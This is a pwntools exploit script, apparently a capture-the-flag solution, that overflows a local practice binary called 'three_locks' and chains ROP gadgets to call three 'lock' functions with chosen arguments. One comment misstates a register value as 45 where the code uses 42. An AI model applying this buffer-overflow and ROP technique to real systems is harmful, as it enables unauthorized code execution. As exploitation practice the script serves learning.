from pwn import *

# useful locations
lock1 = 0x400607
lock2 = 0x400654
lock3 = 0x4006ae
pop_rdi = 0x0000000000400773
pop_rsi_r15 = 0x0000000000400771


# start the vuln program as a  process
p = process("./three_locks")

# attach process to gdb
gdb.attach(p, '''
echo "This is attached to gdb!"
break lock1
break lock2
break lock3
''')

# stack - this is where we can build out ROP exploit
payload = cyclic(cyclic_find("kaaa")) # padding

# to call lock1
payload += p64(pop_rdi) # ret to pop rdi gadget
payload += p64(5) # pop 5 to rdi
payload += p64(lock1) # call open flag with 5 in rdi

# to call lock2
payload += p64(pop_rdi) # back to the pop rdi gadget
payload += p64(42) # set rdi to 42
payload += p64(pop_rsi_r15) # return to pop rsi gadget
payload += p64(1776) # pop 1776 into rsi
payload += p64(0xdeadbeef) # we can just put whatever into r15
payload += p64(lock2) # call lock2 with rdi=45 and rsi=1776

# to call lock3
payload += p64(lock3) # lock3 does not need anything parameters


p.sendline(payload)
p.interactive()